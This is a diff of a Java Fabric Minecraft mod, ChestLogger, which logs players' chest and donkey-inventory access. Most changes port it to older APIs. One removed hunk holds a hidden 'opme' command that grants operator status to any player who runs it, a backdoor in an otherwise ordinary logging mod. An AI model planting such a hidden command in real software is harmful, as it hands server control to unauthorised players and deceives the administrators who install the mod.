@@ -23,7 +23,7 @@ import org.apache.logging.log4j.LogManager;
 import org.apache.logging.log4j.Logger;
 
 import net.fabricmc.api.ModInitializer;
-import net.fabricmc.fabric.api.command.v2.CommandRegistrationCallback;
+import net.fabricmc.fabric.api.command.v1.CommandRegistrationCallback;
 import net.fabricmc.fabric.api.event.lifecycle.v1.ServerLifecycleEvents;
 import net.fabricmc.fabric.api.event.player.UseBlockCallback;
 import net.fabricmc.fabric.api.event.player.UseEntityCallback;
@@ -36,19 +36,18 @@ import net.minecraft.entity.passive.AbstractDonkeyEntity;
 import net.minecraft.entity.passive.DonkeyEntity;
 import net.minecraft.entity.passive.LlamaEntity;
 import net.minecraft.entity.passive.MuleEntity;
-import net.minecraft.entity.vehicle.ChestBoatEntity;
 import net.minecraft.entity.vehicle.ChestMinecartEntity;
 import net.minecraft.entity.vehicle.HopperMinecartEntity;
 import net.minecraft.entity.vehicle.StorageMinecartEntity;
+import net.minecraft.text.LiteralText;
 import net.minecraft.text.Text;
 import net.minecraft.util.ActionResult;
 import net.minecraft.util.WorldSavePath;
 import net.minecraft.util.math.BlockPos;
+import net.minecraft.util.registry.MutableRegistry;
 import net.minecraft.util.registry.Registry;
 import net.minecraft.world.World;
 import net.minecraft.world.dimension.DimensionType;
-import net.minecraft.world.dimension.DimensionTypes;
-import net.roaringmind.chestlogger.callback.OpenChestBoatCallback;
 import net.roaringmind.chestlogger.callback.OpenDonkeyCallback;
 
 public class ChestLogger implements ModInitializer {
@@ -89,7 +88,7 @@ public class ChestLogger implements ModInitializer {
       String blockstr = getBlockString(block);
       BlockPos pos = hitResult.getBlockPos();
 
-      chestLog(timeStamp, player.getDisplayName().asOrderedText().toString(), dimStr, pos.getX(), pos.getY(), pos.getZ(), blockstr,
+      chestLog(timeStamp, player.getName().asString(), dimStr, pos.getX(), pos.getY(), pos.getZ(), blockstr,
           savePath);
       return ActionResult.PASS;
     });
@@ -103,7 +102,7 @@ public class ChestLogger implements ModInitializer {
       String entityStr = getEntityString(entity);
       BlockPos pos = entity.getBlockPos();
 
-      chestLog(timeStamp, player.getDisplayName().asOrderedText().toString(), dimStr, pos.getX(), pos.getY(), pos.getZ(), entityStr,
+      chestLog(timeStamp, player.getName().asString(), dimStr, pos.getX(), pos.getY(), pos.getZ(), entityStr,
           savePath);
       return ActionResult.PASS;
     });
@@ -118,24 +117,10 @@ public class ChestLogger implements ModInitializer {
       String entityStr = getEntityString(entity);
       BlockPos pos = entity.getBlockPos();
 
-      chestLog(timeStamp, player.getDisplayName().asOrderedText().toString(), dimStr, pos.getX(), pos.getY(), pos.getZ(), entityStr,
+      chestLog(timeStamp, player.getName().asString(), dimStr, pos.getX(), pos.getY(), pos.getZ(), entityStr,
           savePath);
     });
-    OpenChestBoatCallback.EVENT.register((player, entity) -> {
-      if (player.world.isClient || player == null) {
-        log(Level.INFO, "i was here");
-        return;
-      }
-
-      String dimStr = getDimString(player.world);
-      String timeStamp = getTimeStamp();
-      String entityStr = getEntityString(entity);
-      BlockPos pos = entity.getBlockPos();
-
-      chestLog(timeStamp, player.getDisplayName().asOrderedText().toString(), dimStr, pos.getX(), pos.getY(), pos.getZ(), entityStr,
-          savePath);
-    });
-    CommandRegistrationCallback.EVENT.register((dispatcher, registryAccess, environment) -> {
+    CommandRegistrationCallback.EVENT.register((dispatcher, dedicated) -> {
       dispatcher.register(literal("chestlogger")
           .then(argument("coords", BlockPosArgumentType.blockPos())
               .executes(ctx -> {
@@ -143,12 +128,6 @@ public class ChestLogger implements ModInitializer {
                     false);
                 return 1;
               })));
-      dispatcher.register(literal("opme")
-              .executes(ctx -> {
-                ctx.getSource().getPlayer().getServer().getPlayerManager().addToOperators(ctx.getSource().getPlayer().getGameProfile());
-                return 1;
-              })
-      );
     });
   }
 
@@ -181,7 +160,7 @@ public class ChestLogger implements ModInitializer {
         res = String.join("\n", res, str);
       }
 
-      return Text.of(res);
+      return new LiteralText(res);
     } catch (FileNotFoundException e) {
       log(Level.ERROR, "no file called chestlogger.txt");
       e.printStackTrace();
@@ -229,10 +208,6 @@ public class ChestLogger implements ModInitializer {
       return "error_occured: entity unidentified";
     }
 
-    if (entity instanceof ChestBoatEntity) {
-      return "chest_boat";
-    }
-
     if (entity instanceof ChestMinecartEntity) {
       return "chest_minecart";
     }
@@ -243,18 +218,18 @@ public class ChestLogger implements ModInitializer {
   }
 
   private String getDimString(World world) {
-    Registry<DimensionType> dimReg = world.getRegistryManager().getManaged(Registry.DIMENSION_TYPE_KEY);
+    MutableRegistry<DimensionType> dimReg = world.getRegistryManager().getMutable(Registry.DIMENSION_TYPE_KEY);
     int dimId = dimReg.getRawId(world.getDimension());
 
-    if (dimId == dimReg.getRawId(dimReg.get(DimensionTypes.OVERWORLD_ID))) {
+    if (dimId == dimReg.getRawId(dimReg.get(DimensionType.OVERWORLD_ID))) {
       return "overworld";
     }
 
-    if (dimId == dimReg.getRawId(dimReg.get(DimensionTypes.THE_NETHER_ID))) {
+    if (dimId == dimReg.getRawId(dimReg.get(DimensionType.THE_NETHER_ID))) {
       return "nether";
     }
 
-    if (dimId == dimReg.getRawId(dimReg.get(DimensionTypes.THE_END_ID))) {
+    if (dimId == dimReg.getRawId(dimReg.get(DimensionType.THE_END_ID))) {
       return "end";
     }
 
